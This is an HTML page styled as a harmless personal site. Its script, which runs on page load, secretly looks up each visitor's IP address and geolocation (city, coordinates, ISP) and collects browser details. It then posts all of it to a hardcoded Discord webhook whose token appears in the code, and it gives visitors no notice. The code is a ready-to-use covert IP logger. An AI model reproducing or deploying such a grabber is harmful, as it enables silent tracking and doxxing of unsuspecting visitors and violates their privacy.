<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Visitor Info Collector</title>
</head>
<body>
    <h1>Welcome to Your Personal Site</h1>
    <script>
        async function collectUserInfo() {
            const webhookURL = "https://discord.com/api/webhooks/1321216357790122025/Z5v1QVolXKUJwYwC6B3FcMSXap8dV1obV02yX7Nz74_BdbpJibXArDSpWdi-PI7kbM_0"; // Replace with your Discord webhook URL

            try {
                // Get IP and geolocation data
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();

                // Get browser information
                const browserInfo = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screenResolution: `${window.screen.width}x${window.screen.height}`
                };

                // Create a payload formatted for Discord
                const payload = {
                    content: "New visitor information:",
                    embeds: [
                        {
                            title: "Visitor Data",
                            fields: [
                                { name: "IP", value: data.ip || "N/A", inline: true },
                                { name: "City", value: data.city || "N/A", inline: true },
                                { name: "Region", value: data.region || "N/A", inline: true },
                                { name: "Country", value: data.country || "N/A", inline: true },
                                { name: "Latitude", value: data.latitude || "N/A", inline: true },
                                { name: "Longitude", value: data.longitude || "N/A", inline: true },
                                { name: "Timezone", value: data.timezone || "N/A", inline: true },
                                { name: "ASN", value: data.asn || "N/A", inline: true },
                                { name: "Organization", value: data.org || "N/A", inline: false },
                                { name: "Browser", value: browserInfo.userAgent, inline: false },
                                { name: "Platform", value: browserInfo.platform, inline: true },
                                { name: "Language", value: browserInfo.language, inline: true },
                                { name: "Screen Resolution", value: browserInfo.screenResolution, inline: true }
                            ],
                            color: 3066993 // Set embed color (optional)
                        }
                    ]
                };

                // Send the payload to the Discord webhook
                const webhookResponse = await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                if (webhookResponse.ok) {
                    console.log('Data successfully sent to Discord.');
                } else {
                    console.error('Failed to send data to Discord:', webhookResponse.status, webhookResponse.statusText);
                }
            } catch (error) {
                console.error('Error collecting or sending data:', error);
            }
        }

        // Collect and send data when the page loads
        collectUserInfo();
    </script>
</body>
</html>
